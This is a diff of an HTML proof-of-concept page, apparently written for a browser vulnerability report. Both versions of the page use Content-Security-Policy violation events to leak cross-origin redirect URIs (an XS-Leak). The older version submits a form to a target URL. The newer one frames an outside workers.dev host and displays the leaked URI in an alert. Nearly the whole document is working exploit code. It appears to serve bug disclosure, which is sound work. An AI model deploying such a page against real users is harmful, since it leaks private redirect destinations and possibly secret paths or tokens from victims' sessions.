@@ -1,47 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>POC - Putra Mahardika</title>
-    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-    <script>eruda.init();</script>
-    
-    <script>
-        const params = new URLSearchParams(window.location.search);
-        const targetUrl = params.get('url') || 'https://fb.com/secret/path/test';
-        const allowedDomain = params.get('domain') || 'fb.com';
-
-        const metaCSP = document.createElement('meta');
-        metaCSP.setAttribute('http-equiv', 'Content-Security-Policy');
-        metaCSP.setAttribute('content', `default-src 'self' 'unsafe-inline'; form-action 'self' ${allowedDomain};`);
-        document.head.appendChild(metaCSP);
-    </script>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; frame-src https://summer-waterfall-d973.utaa1009.workers.dev;">
+    <title>Iframe Redirect Leak PoC</title>
 </head>
 <body>
-    <p>Target: <strong id="displayUrl"></strong></p>
-    <button id="exploitBtn" style="padding: 15px; font-weight: bold;">RUN EXPLOIT</button>
+
+    <h3>Iframe CSP Redirect Leak (XS-Leak)</h3>
+    
+    <button id="exploitBtn">Run Exploit</button>
+    <p id="status" style="word-break: break-all;">Status: Waiting...</p>
+    <div id="frameContainer"></div>
 
     <script>
-        document.getElementById('displayUrl').innerText = targetUrl;
+        const statusDiv = document.getElementById('status');
 
-        // Listener khusus buat Console
         document.addEventListener('securitypolicyviolation', (e) => {
-            console.log('--- VIOLATION DETECTED ---');
-            console.log('Blocked URI:', e.blockedURI); // Ini yang diminta Apple
-            console.log('Violated Directive:', e.violatedDirective);
-            console.log('Full Event Object:', e);
+            // NGE-PRINT KE LAYAR HP SECARA LANGSUNG
+            statusDiv.innerHTML = `<br><b style="color:red; font-size:18px;">LEAKED URI:<br>${e.blockedURI}</b>`;
+            
+            // POP-UP ALERT BIAR MAKIN DRAMATIS DI VIDEO
+            alert('VULNERABILITY CONFIRMED!\n\nLeaked Origin:\n' + e.blockedURI);
         });
 
         document.getElementById('exploitBtn').addEventListener('click', () => {
-            const win = window.open('about:blank');
-            try { win.close(); } catch(e) {}
+            statusDiv.innerHTML = "Injecting iframe...";
             
-            const form = document.createElement('form');
-            form.method = 'GET';
-            form.action = targetUrl;
-            document.body.appendChild(form);
-            form.submit();
+            const iframe = document.createElement('iframe');
+            iframe.src = "https://summer-waterfall-d973.utaa1009.workers.dev/";
+            iframe.style.width = "100%";
+            iframe.style.height = "100px";
+            iframe.style.border = "1px solid black";
+            document.getElementById('frameContainer').appendChild(iframe);
         });
     </script>
+
 </body>
 </html>
